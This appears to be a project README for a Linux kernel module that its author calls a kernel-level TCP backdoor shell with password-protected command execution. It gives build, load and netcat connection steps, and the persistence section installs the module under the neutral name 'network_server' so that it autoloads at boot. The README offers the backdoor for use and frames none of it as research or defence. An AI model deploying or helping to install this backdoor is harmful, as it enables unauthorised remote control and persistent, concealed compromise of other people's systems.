# Garpoz_Reptile 🐍🍉

🚀 **Garpoz_Reptile – Kernel level TCP backdoor shell with password authentication and command execution**

---

## 📥 Installation

### 1) Install kernel headers

Check your running kernel version:

```bash
uname -r
```

Install matching headers for your distro:

**Debian, Ubuntu, Raspberry Pi OS**

```bash
sudo apt-get update
sudo apt-get install linux-headers-$(uname -r) build-essential
```

**Fedora, CentOS Stream, RHEL**

```bash
sudo dnf install kernel-devel-$(uname -r) gcc make
```

**Arch Linux**

```bash
sudo pacman -Syu --noconfirm
sudo pacman -S --noconfirm linux-headers base-devel
```

> Headers must match `$(uname -r)` or the build will fail.

---

### 2) Get the source

```bash
git clone https://github.com/GarpozMaster/Garpoz_Reptile.git
cd Garpoz_Reptile
```

The module source is now in your working directory.

---

## 🔧 Configure

Edit the file `minimal_net_server.c` to set your port and password:

```c
#define PORT 9999
#define PASSWORD "change_me"
```

make it after changes:

```bash
make
```

---

## 🚀 Usage

### Activate the module

```bash
sudo insmod network_server.ko
```

Verify it is loaded:

```bash
lsmod | grep network_server
```

### Connect to it

Use netcat from the same host or a host that can reach the chosen IP and port:

```bash
nc -v <ip> <port>
# example for local test:
# nc -v 127.0.0.1 9999
```

You will be prompted for the password.

### Deactivate the module

```bash
sudo rmmod network_server
```

---

## ♻️ Persistent load at boot

1. Copy the module to the kernel tree:

```bash
sudo cp network_server.ko /lib/modules/$(uname -r)/kernel/drivers/
```

2. Regenerate dependencies:

```bash
sudo depmod -a
```

3. Create an autoload config:

```bash
echo network_server | sudo tee /etc/modules-load.d/network_server.conf
```

Now the module will load automatically on boot. ✅

---

## 🧰 Clean build artifacts

```bash
make clean
```

---

## 🛠️ Dependencies

* Matching kernel headers for `$(uname -r)`
* Standard toolchain: `make`, `gcc`
* Module tools: `insmod`, `rmmod`, `depmod`

---

## 📄 License

This project is licensed under **GPL**. See `LICENSE` for details.

---

Made with ⚡ by **GarpozMaster**
